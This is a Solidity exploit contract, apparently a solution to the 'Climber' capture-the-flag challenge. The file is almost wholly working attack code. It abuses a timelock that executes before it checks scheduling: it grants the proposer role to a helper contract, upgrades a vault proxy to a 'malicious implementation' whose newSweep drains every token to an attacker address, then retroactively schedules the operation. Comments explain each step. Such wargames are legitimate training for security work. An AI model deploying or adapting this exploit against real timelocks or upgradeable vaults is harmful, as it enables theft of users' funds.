// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract ClimberExploit {

    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    ClimberTimelock public climberTimelock;
    ClimberVault public climberVault;
    IERC20 public token;
    address public attacker;

    
    constructor(address climberVaultAddress, address climberTimelockAddress, address tokenAddress, address _attacker) {
        climberVault = ClimberVault(climberVaultAddress);
        climberTimelock = ClimberTimelock(payable(climberTimelockAddress));
        token = IERC20(tokenAddress);
        attacker = _attacker;
    }


    function pwn() public {
        //What we have to do within execution:
        //Due to a bug in the implementation of getOperationState, the delay actually does not work, therefore we dont
        //even need to manipulate the delay-value via updateDelay()

        //1.    In order to avoid the recursion described below, we have to make the scheduler a valid proposer, which we can do,
        //      since the timelock itself is admin of the proposer role.
        //2.    We upgrade the implementation contract to our malicious implementation and sweep the funds to the attacker
        //3.    Then schedule this very operation via the scheduleCaller
        
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);
        bytes32 salt = bytes32("0x0");

        //Create the scheduleCaller, which will schedule the operation taking place
        ScheduleCaller scheduleCaller = new ScheduleCaller();
        //Our malicious new implementation that enables us to sweep the funds
        UpgradedMaliciousImplementation newImplementation = new UpgradedMaliciousImplementation();

        //1. Make scheduler valid proposer
        targets[0] = address(climberTimelock);
        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(scheduleCaller));
        values[0] = 0;

        //2. - Call upgradeTo with a call that directly sweeps the funds - 
        //We can do that, since we call from the owner, i.e. the timelock
        targets[1] = address(climberVault);
        bytes memory sweepEncoded = abi.encodeWithSignature("newSweep(address,address)", address(token), attacker); 
        dataElements[1] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(newImplementation), sweepEncoded);      
        values[1] = 0;

        //3. Encode the function call to schedule this operation via the schedulecaller contract
        targets[2] = address(scheduleCaller);
        //Not including the necessary dataElements here, will be sent seperately to the contract..
        dataElements[2] = abi.encodeWithSignature("callSchedule(address,address[],uint256[],bytes32)", address(climberTimelock), targets, values, salt);
        values[2] = 0;

        //dataElements can not be part of the schedule-call, as we can not create the proper id  within the entire execute-operation if dataElements is part of it.
        //Essentially, for the proper id the entire dataElements-array is required, but if we call schedule within the execution-ops, only a slot of the array is used
        //Therefore directly set it within the storage of scheduleCaller and only call the scheduleCaller with the other parameters necessary from the execute-function.
        scheduleCaller.setDataElements(dataElements);

        //Finally make the call
        climberTimelock.execute(targets, values, dataElements, salt);            
    }

}

//I must be honest, I found all the other necessary steps, but I was stuck because I didnt come up with the idea 
//of excluding dataElements as a parameter from the execution-steps by outsourcing it to another contract 
//Even though it is now outsourced to another contract, we still call it from within the execution function - genius!
contract ScheduleCaller {

    bytes[] dataElements;

    function setDataElements(bytes[] memory _dataElements) public{
        dataElements = _dataElements;
    }

    function callSchedule(address climberTimelockAddress, address[] calldata targets, uint256[] calldata values, bytes32 salt) public {
        ClimberTimelock(payable(climberTimelockAddress)).schedule(targets, values, dataElements, salt);
    }
}

//Only inherits from ClimberVault so I dont need to override the necessary methods to make it inherit from UUPSUpgradable
contract UpgradedMaliciousImplementation is ClimberVault{

    function newSweep(address tokenAddress, address attacker) public {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(attacker, token.balanceOf(address(this))), "Transfer failed");
    }
}